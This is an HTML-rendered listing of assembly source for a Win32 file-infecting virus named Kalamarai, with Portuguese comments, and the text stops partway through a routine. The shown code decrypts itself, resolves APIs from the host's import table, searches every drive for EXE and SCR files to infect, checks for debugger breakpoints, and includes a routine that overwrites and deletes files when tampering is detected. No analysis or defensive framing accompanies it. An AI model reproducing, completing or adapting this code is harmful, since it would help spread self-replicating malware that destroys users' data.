<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Kala.7620 - kalamarai.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Kalamarai virus - Um caso cl†ssico de personalidade dupla ;)</span><span class="sc0">

</span><span class="sc1">;Este virus pode corrigir atÇ 90 bytes linearmente modificados a cada ciclo,</span><span class="sc0">
</span><span class="sc1">;usando uma rotina de ECC Reed-Solomon, portanto, tentativas de modificar o</span><span class="sc0">
</span><span class="sc1">;codigo residente s∆o futeis, e perigosas, pois se o virus n∆o consegue</span><span class="sc0">
</span><span class="sc1">;corrigir todas as modificaá‰es(mais de 90 bytes), deleta todos os arquivos</span><span class="sc0">
</span><span class="sc1">;de todos os discos. O virus Ç encriptado usando MUL/DIV, obtem as APIs</span><span class="sc0">
</span><span class="sc1">;diretamente da ImportTable do hospedeiro, e cria uma thread paralela para se</span><span class="sc0">
</span><span class="sc1">;executar. O virus busca recursivamente todos os discos por arquivos PE de</span><span class="sc0">
</span><span class="sc1">;extens∆o EXE e SCR.</span><span class="sc0">

</span><span class="sc1">;Atená∆o: N∆o modifique! O c¢digo sempre deve ser multiplo de 249!</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc5">RELOCS</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">094h</span><span class="sc0">

</span><span class="sc5">ofs</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
</span><span class="sc5">by</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">wo</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">dwo</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

</span><span class="sc9">.xlist</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">.list</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">v_ini</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">vofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;parÉmetro da thread=reloc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
     </span><span class="sc5">chave</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">desencripta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                    </span><span class="sc1">;dword1*key+dword2</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">desencripta</span><span class="sc0">
  </span><span class="sc5">entrada</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">                                      </span><span class="sc1">;entrada da primeira geraá∆o</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
  </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">reloctable</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;edi=inicio do virus</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                               </span><span class="sc1">;ebp=diferenáa do offset original</span><span class="sc0">
     </span><span class="sc5">numeroreloc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">arruma</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;encriptaá∆o leve</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">;arruma ponteiro</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">arruma</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">GMHA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">;ponteiro para a ImportTable</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">kernel32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ebp=kernel32 module handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">GPA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;ponteiro para a ImportTable</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">kernel32API</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">CreateThread_</span><span class="sc0">
  </span><span class="sc5">proximaAPI</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;todas as APIs obtidas?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">feito</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">;pega endereáo</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                   </span><span class="sc1">;busca inicio da proxima API</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">proximaAPI</span><span class="sc0">
  </span><span class="sc5">feito</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetTickCount</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chave</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;escolhe chave de encriptaá∆o</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chave</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000000001000001010101000000001b</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">chave</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000000001111111111111111111111b</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">corrige</span><span class="sc0">                         </span><span class="sc1">;rotina para evitar modificaá‰es</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cria_thread</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">thread_id</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">thread_corrige</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">di_novo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">infecta_pe</span><span class="sc0">                      </span><span class="sc1">;rotina para chamar a cada arquivo</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">busca_recursiva</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cria_thread</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Sleep2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;dorme por 1 hora</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">di_novo</span><span class="sc0">

</span><span class="sc5">cria_tabela</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calcula_crc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crc32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;salva not(crc32) do virus</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tabela</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">constroi</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;ecx=parÉmetro</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">constroi_bloco</span><span class="sc0">                      </span><span class="sc1">;esi=6 bytes de CCE</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;posiá∆o no buffer</span><span class="sc0">
       </span><span class="sc6">movsd</span><span class="sc0">
       </span><span class="sc6">movsw</span><span class="sc0">                                    </span><span class="sc1">;salva codigo para este bloco</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BLOCOS</span><span class="sc0">                           </span><span class="sc1">;proximo bloco</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">constroi</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fode_tudo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;remove atributos do arquivo</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">deleta_igual</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUNCATE_EXISTING</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;sobreescreve arquivo</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">deleta_igual</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;argumento para fechar</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fim_mensagem</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mensagem</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mensagem</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;escreve nossa mensagem</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;fecha arquivo</span><span class="sc0">
  </span><span class="sc5">deleta_igual</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DeleteFileA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;detona arquivo</span><span class="sc0">
  </span><span class="sc5">nao_e</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">mensagem</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"never touch the kala-marai!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fim_mensagem</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">infecta_pe</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrlen</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EXE."</span><span class="sc0">                          </span><span class="sc1">;extens∆o Ç valida pra infeá∆o?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">detona</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"RCS."</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nao_e</span><span class="sc0">
  </span><span class="sc5">detona</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infecta_arquivo</span><span class="sc0">                     </span><span class="sc1">;manda bala!</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nao_e</span><span class="sc0">

</span><span class="sc5">para_correcao</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
  </span><span class="sc5">segura</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">espera</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;n∆o podemos mexer em nada...</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">segura</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">thread_corrige</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SuspendThread</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;segura thread que corrige</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0cch</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mexeu_pagou</span><span class="sc0">                           </span><span class="sc1">;breakpoint esperando?</span><span class="sc0">
  </span><span class="sc5">volta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">segue_correcao</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cria_tabela</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">thread_corrige</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;continua thread de correá∆o</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ResumeThread</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">volta</span><span class="sc0">                                </span><span class="sc1">;temos que economizar bytes...</span><span class="sc0">

</span><span class="sc5">corrige</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">espera</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">BLOCOS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">final_virus</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)/</span><span class="sc2">249</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc4">+</span><span class="sc5">MEM_COMMIT</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BLOCOS</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">)+</span><span class="sc2">249</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirtualAlloc</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tabela</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;n∆o h† memoria suficiente...</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">deu_merda</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cria_tabela</span><span class="sc0">                         </span><span class="sc1">;cria correá∆o e crc32</span><span class="sc0">
